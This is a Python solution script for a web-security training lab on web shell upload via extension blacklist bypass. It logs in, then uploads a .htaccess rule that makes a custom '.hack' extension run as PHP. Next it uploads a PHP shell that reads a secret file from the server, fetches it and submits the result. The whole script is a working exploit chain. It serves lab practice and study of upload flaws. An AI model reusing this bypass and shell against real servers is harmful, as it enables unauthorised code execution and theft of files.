##########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 12/10/2023
#
# Lab: Web shell upload via extension blacklist bypass
#
# Steps: 1. fetch the login page
#        2. Extract the csrf token and session cookie
#        3. Login as wiener
#        4. Fetch wiener profile
#        5. Upload a .htaccess file containing a mapping rule to a custom extension
#        6. Upload the shell file with the custom extension
#        7. Fetch the uploaded shell file to read the secret
#        8. Submit the solution 
#
##########################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0ac7003e04332753803b4e5300b2006e.web-security-academy.net"

try:  
    # fetch the login page
    get_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)


print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch wiener profile
    wiener = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener profile through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. " + Fore.GREEN + "OK")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]

# the .htaccess with our own rule
# this rule maps the files with the extension .hack to be executed as a php files
# you can change .hack to what you want but change the shell_file_name variable accordingly
htaccess_file = "AddType application/x-httpd-php .hack"

# set the avatar
files = {
    "avatar": (".htaccess", htaccess_file, "text/plain")
}

# set the other data to send with the avatar
data = {
    "user": "wiener",
    "csrf": csrf 
}

try:  
    # upload the .htaccess file
    requests.post(f"{url}/my-account/avatar", data, files=files, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to upload the .htaccess file through exception")
    exit(1)

print(Fore.WHITE + "⦗5⦘ Uploading a .htaccess file containing a mapping rule to a custom extension.. " + Fore.GREEN + "OK")

# the shell file to be uploaded
shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""

# the shell file name
# you can change this to what you want but keep the extension .hack unless you changed it in the .htaccess rule above
shell_file_name = "shell.hack"

# set the avatar
files = {
    "avatar": (shell_file_name, shell_file, "application/x-php")
}

# set the other data to send with the avatar
data = {
    "user": "wiener",
    "csrf": csrf 
}

try:  
    # upload the shell file
    requests.post(f"{url}/my-account/avatar", data, files=files, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to upload the shell file through exception")
    exit(1)

print(Fore.WHITE + "⦗6⦘ Uploading the shell file with the custom extension.. " + Fore.GREEN + "OK")

try:
    # fetch the uploaded shell file
    uploaded_shell = requests.get(f"{url}/files/avatars/{shell_file_name}", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the uploaded shell file through exception")
    exit(1)

print(Fore.WHITE + "⦗7⦘ Fetching the uploaded shell file to read the secret.. " + Fore.GREEN + "OK")

# get carlos secret
secret = uploaded_shell.text

print(Fore.BLUE + "❯ Secret: " + Fore.YELLOW + secret)

# set answer
data = {
    "answer": secret
}

try:
    # submit the solution
    requests.post(f"{url}/submitSolution", data)

except:
    print(Fore.RED + "[!] Failed to submit the solution through exception")
    exit(1)

print(Fore.WHITE + "⦗8⦘ Submitting the solution.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


